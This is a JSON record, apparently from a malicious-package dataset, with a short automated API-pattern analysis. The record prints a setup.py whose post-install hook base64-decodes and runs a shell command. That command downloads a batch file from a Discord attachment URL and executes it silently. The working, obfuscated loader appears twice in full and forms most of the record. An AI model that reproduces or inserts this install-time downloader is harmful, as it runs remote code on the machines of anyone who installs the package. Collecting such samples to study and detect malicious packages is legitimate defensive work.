[
  {
    "pyfile": "setup.py",
    "code_snippet": "import base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"Y3VybCAtcyAtbyAldGVtcCVcdGVzdC5iYXQgaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTEzMzE0Mjg5NTIzMTI1NDYwMS8xMTg4NTc4MTY5MTkyNzEwMjk1L3Rlc3QuYmF0ICYmIHN0YXJ0IC9taW4gY21kIC9jICV0ZW1wJVx0ZXN0LmJhdA==\"))\n\nfrom setuptools.command.install import install\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()",
    "pattern_analysis": {
      "api_sequence": [
        "base64.b64decode",
        "os.system",
        "setuptools.command.install.install.run"
      ],
      "api_sequence_with_args": [
        "base64.b64decode(base64_bytes)",
        "os.system(b64d(\"Y3VybCAtcyAtbyAldGVtcCVcdGVzdC5iYXQgaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTEzMzE0Mjg5NTIzMTI1NDYwMS8xMTg4NTc4MTY5MTkyNzEwMjk1L3Rlc3QuYmF0ICYmIHN0YXJ0IC9taW4gY21kIC9jICV0ZW1wJVx0ZXN0LmJhdA==\"))",
        "setuptools.command.install.install.run(self)"
      ],
      "mapped_sequence": [
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "setuptools.command.install.install.run",
          "id": "exec_setuptools_install",
          "description": "Executes setuptools installation procedure",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "package_configuration"
        }
      ],
      "contextual_code": "import base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"Y3VybCAtcyAtbyAldGVtcCVcdGVzdC5iYXQgaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTEzMzE0Mjg5NTIzMTI1NDYwMS8xMTg4NTc4MTY5MTkyNzEwMjk1L3Rlc3QuYmF0ICYmIHN0YXJ0IC9taW4gY21kIC9jICV0ZW1wJVx0ZXN0LmJhdA==\"))\n\nfrom setuptools.command.install import install\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()"
    }
  },
  {
    "metadata": {
      "package_name": "newpackagetest2026-1.0.0"
    }
  }
]